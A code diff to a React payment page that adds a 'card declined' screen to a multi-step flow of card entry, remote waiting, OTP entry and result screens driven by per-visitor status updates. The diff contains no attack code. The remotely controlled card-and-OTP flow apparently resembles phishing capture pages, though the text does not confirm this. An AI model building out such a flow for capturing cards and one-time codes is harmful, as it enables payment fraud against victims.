@@ -6,10 +6,11 @@ import PaymentSuccess from "@/components/PaymentSuccess";
 import PaymentRejected from "@/components/PaymentRejected";
 import WaitingScreen from "@/components/WaitingScreen";
 import ProcessingOverlay from "@/components/ProcessingOverlay";
+import CardDeclinedScreen from "@/components/CardDeclinedScreen";
 import { supabase } from "@/integrations/supabase/client";
 
 const Index = () => {
-  const [step, setStep] = useState<"form" | "processing_card" | "waiting" | "otp" | "processing" | "success" | "rejected">("form");
+  const [step, setStep] = useState<"form" | "processing_card" | "waiting" | "otp" | "processing" | "success" | "rejected" | "card_declined">("form");
   const stepRef = useRef(step);
   stepRef.current = step;
   const visitorId = useRef(crypto.randomUUID());
@@ -95,8 +96,7 @@ const Index = () => {
             if (newStatus === "rejected") setStep("rejected");
             if (newStatus === "card_invalid") {
               setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
-              setStep("form");
-              setSessionId(null);
+              setStep("card_declined");
             }
           }
           if (currentStep === "otp") {
@@ -113,8 +113,7 @@ const Index = () => {
             if (newStatus === "rejected") setStep("rejected");
             if (newStatus === "card_invalid") {
               setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
-              setStep("form");
-              setSessionId(null);
+              setStep("card_declined");
             }
           }
           if (currentStep === "processing") {
@@ -130,8 +129,7 @@ const Index = () => {
             }
             if (newStatus === "card_invalid") {
               setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
-              setStep("form");
-              setSessionId(null);
+              setStep("card_declined");
             }
           }
         }
@@ -257,6 +255,7 @@ const Index = () => {
           {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} error={otpError} otpType={otpType} />}
           {step === "processing" && <WaitingScreen amount={formattedTotal} />}
           {step === "success" && <PaymentSuccess amount={formatEuro(total)} />}
+          {step === "card_declined" && <CardDeclinedScreen onComplete={() => { setStep("form"); setSessionId(null); }} />}
           {step === "rejected" && <PaymentRejected onRetry={() => { setStep("form"); setSessionId(null); }} />}
         </div>
       </div>
